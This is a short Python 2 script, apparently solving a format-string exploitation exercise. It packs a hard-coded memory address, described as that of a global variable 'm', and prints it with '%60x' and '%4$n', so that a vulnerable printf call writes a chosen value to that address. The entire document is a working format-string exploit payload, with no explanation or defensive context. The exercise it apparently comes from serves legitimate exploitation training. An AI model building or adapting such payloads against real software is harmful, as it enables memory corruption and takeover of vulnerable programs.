import struct

# The address of the global variable m
target = struct.pack('I', 0x804988c)
print target + '%60x' + '%4$n'
